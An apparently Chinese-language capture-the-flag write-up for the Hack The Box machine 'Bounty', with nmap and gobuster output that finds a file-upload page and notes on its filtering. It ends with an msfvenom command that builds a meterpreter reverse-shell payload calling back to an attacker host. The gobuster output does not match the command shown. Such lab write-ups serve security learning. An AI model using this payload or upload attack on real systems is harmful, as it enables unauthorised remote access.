# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/htb/Bounty]
└─# nmap -sV -Pn 10.10.10.93 -p-                                                                                                                                                                                                        1 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-16 22:37 EST
Nmap scan report for 10.10.10.93
Host is up (0.27s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 360.04 seconds

```

## 目录爆破
```
└─# gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx                    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.93
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/16 22:44:15 Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200)
/aspnet_client        (Status: 301) [Size: 156] [--> http://10.10.10.93/aspnet_client/]
/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
                                                                                       
===============================================================
2021/12/16 22:46:25 Finished
===============================================================

```

transfer.aspx是一个文件上传页面,测试发现不可以直接上传aspx文件，可以上传jpg文件

所有成功上传的文件都会到uploadedfiles下，不过这个目录下的文件过一段时间（几十秒）就会被删除






msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f asp > shell.aspx